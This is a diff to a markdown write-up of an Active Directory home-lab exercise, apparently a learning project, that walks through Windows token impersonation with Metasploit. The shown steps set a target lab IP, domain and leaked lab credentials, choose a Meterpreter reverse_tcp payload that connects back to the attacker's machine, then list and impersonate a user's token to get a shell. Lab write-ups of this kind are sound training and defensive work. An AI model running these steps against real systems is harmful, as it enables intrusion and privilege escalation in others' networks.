@@ -1,4 +1,14 @@
+# Attack Simulation
 
+## Overview
+
+This section documents the offensive execution of Token Impersonation within the Active Directory lab environment. It covers the attack methodology, tools used, and the sequence of actions taken to obtain and impersonate an existing privileged access token.
+
+The objective is to demonstrate how an attacker can abuse an existing Windows security context to operate under another user's privileges without requiring the user's password.
+
+---
+
+## Attack Steps
 
 Open Metasploit
 
@@ -21,25 +31,25 @@ options
 Set the Remote Hosts to be Desktop-1
 
 ```
-set rhosts 192.168.4.16
+set rhosts 192.168.4.11
 ```
 
 Set the domain using the domain name
 
 ```
-set smbdomain mydomain.com
+set smbdomain mydomain.local
 ```
 
 Input the leaked password
 
 ```
-set smbpass Password@1
+set smbpass Password@123
 ```
 
 Set the leaked user's username
 
 ```
-set smbuser ronyango
+set smbuser fernandesb
 ```
 
 Show available exploit targets on the machine
@@ -64,16 +74,6 @@ Set a playload to use on the attack
 
 ```
 set payload windows/x64/meterpreter/reverse_tcp
-```
-
-```
-options
-```
-
-The Kali Linux network interface that receives the reverse connection (LHOST = Listening Host)
-
-```
-set lhosts eth1
 ```
 
 ```
@@ -131,7 +131,7 @@ list_tokens -u
 Impersonate the user. Notice the two backslashes for character escaping
 
 ```
-impersonate_token mydomain\\ronyango
+impersonate_token mydomain\\fernandesb
 ```
 
 Get shell
